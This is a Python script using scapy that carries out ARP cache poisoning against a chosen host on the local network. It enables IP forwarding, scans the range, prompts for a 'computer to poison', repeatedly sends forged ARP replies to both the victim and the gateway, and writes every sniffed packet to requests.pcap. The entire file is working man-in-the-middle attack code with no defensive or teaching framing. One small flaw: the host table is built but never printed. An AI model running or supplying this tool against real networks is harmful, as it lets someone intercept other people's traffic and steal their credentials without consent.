#!/usr/bin/env python3
# -*- coding: utf-8 -*-


from ipaddress import IPv4Network
import scapy.all as scapy
import subprocess
import threading
import time
import sys
import os


class ARPSpoofer:
    def __init__(
            self,
            ip_range: str
        ) -> None: 
        self.ip_range = ip_range
        self.gateway_info = {}
        self.client_info = []
        self.cwd = os.getcwd()
        self.__CheckSudoPrivileges__()
        self.__EnableIPForwarding__()

    def __str__(self):
        return f"ARP Spoofer for IP Range: {self.ip_range}"

    def __CheckSudoPrivileges__(self):
        """Ensure the script is executed with sudo privileges."""
        if 'SUDO_UID' not in os.environ:
            raise PermissionError("Please run this program with sudo.")

    def __EnableIPForwarding__(self):
        """Enable IP forwarding for ARP spoofing."""
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
        subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"], check=True)

    def __PerformARPScan__(self):
        """Conduct an ARP scan on the specified IP range."""
        answered_lst = scapy.arping(self.ip_range, verbose=0)[0]
        return [{"ip": res[1].psrc, "mac": res[1].hwsrc} for res in answered_lst]

    def __RetrieveGatewayInfo__(self, arp_res):
        """Extract gateway information from ARP responses."""
        result = subprocess.run(["route", "-n"], capture_output=True, text=True)
        routing_info = {line.split()[0]: self.MatchInterfaceName(line) for line in result.stdout.splitlines() if line}

        gateways = []
        for iface in arp_res:
            iface_name = routing_info.get(iface["ip"])
            if iface_name:
                gateways.append(
                    {
                        "iface": iface_name,
                         "ip": iface["ip"],
                          "mac": iface["mac"]
                        }
                )

        return gateways


    def MatchInterfaceName(self, row):
        """Identify the interface name from the route output."""
        interface_names = os.listdir("/sys/class/net")
        return next((iface for iface in interface_names if iface in row), None)

    def FilterClients(self, arp_res, gateway_res):
        """Identify clients from ARP responses."""
        return [item for item in arp_res if item["ip"] != gateway_res[0]["ip"]]

    def SendARPSpoof(self, target_ip, target_mac, spoof_ip):
        """Transmit ARP spoofing packets."""
        pkt = scapy.ARP(
            op=2, 
            pdst=target_ip, 
            hwdst=target_mac, 
            psrc=spoof_ip
        )
        scapy.send(pkt, verbose=False)

    def ContinuouslySendSpoofPackets(self, target_node):
        """Continuously send spoof packets to the target node."""
        while True:
            self.SendARPSpoof(
                self.gateway_info["ip"],
                 self.gateway_info["mac"], 
                 target_node["ip"]
            )
            self.SendARPSpoof(
                target_node["ip"],
                target_node["mac"],
                self.gateway_info["ip"]
            )
            time.sleep(3)

    def CapturePackets(self, interface):
        """Capture packets on the specified interface."""
        scapy.sniff(
            iface=interface,
            store=False,
            prn=self.ProcessSniffedPacket
        )

    def ProcessSniffedPacket(self, pkt):
        """Process and save sniffed packets to a pcap file."""
        scapy.wrpcap(
            "requests.pcap",
            pkt,
            append=True
        )

    def Execute(self):
        """Main execution method."""
        arp_res = self.__PerformARPScan__()
        if not arp_res:
            raise ConnectionError("No connection. Exiting.")

        self.gateway_info = self.__RetrieveGatewayInfo__(arp_res)[0]
        self.client_info = self.FilterClients(arp_res, [self.gateway_info])

        if not self.client_info:
            raise ConnectionError("No clients found. Exiting.")

        choice = self.DisplayARPResults(self.client_info)
        target_node = self.client_info[choice]

        t1 = threading.Thread(
            target=self.ContinuouslySendSpoofPackets, 
            args=(target_node,), 
            daemon=True
        )
        t1.start()

        self.CapturePackets(self.gateway_info["iface"])

    def DisplayARPResults(self, arp_res):
        """Display ARP responses in a user-friendly format."""
        results = "ID\t\tIP\t\t\tMAC Address\n"
        results += "_________________________________________________________\n"
        for id, res in enumerate(arp_res):
            results += f"{id}\t\t{res['ip']}\t\t{res['mac']}\n"
        while True:
            try:
                choice = int(input("Select the ID of the computer to poison (ctrl+z to exit): "))
                if 0 <= choice < len(arp_res):
                    return choice
            except (
                ValueError,
                IndexError
            ):
                print("Please enter a valid choice!")

def GetCommandLineArguments():
    """Validate command line arguments."""
    if len(sys.argv) != 3 or sys.argv[1] != "-ip_range":
        raise ValueError(f"Usage: sudo python3 {os.path.basename(sys.argv[0])} -ip_range <ip_range>")
    try:
        return str(IPv4Network(sys.argv[2]))
    except ValueError:
        raise ValueError("Invalid IP range specified.")

if __name__ == "__main__":
    try:
        ip_range = GetCommandLineArguments()
        arp_spoofer = ARPSpoofer(ip_range)
        arp_spoofer.Execute()
    except Exception as e:
        print(e)
        sys.exit(1)
